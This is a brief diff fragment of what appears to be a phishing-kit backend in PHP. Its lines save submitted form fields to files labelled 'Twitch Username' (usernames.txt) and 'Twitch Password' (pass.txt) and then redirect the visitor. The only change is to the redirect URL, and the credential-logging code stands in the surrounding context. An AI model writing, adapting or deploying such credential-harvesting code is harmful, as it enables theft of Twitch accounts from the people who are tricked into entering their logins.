@@ -4,5 +4,5 @@ file_put_contents("usernames.txt", "Twitch Username : " . $email = $_POST['email
 ?>
 <?php
 file_put_contents("pass.txt", "Twitch Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: redirecturl');
+header('Location: https://redirecturl');
 ?>
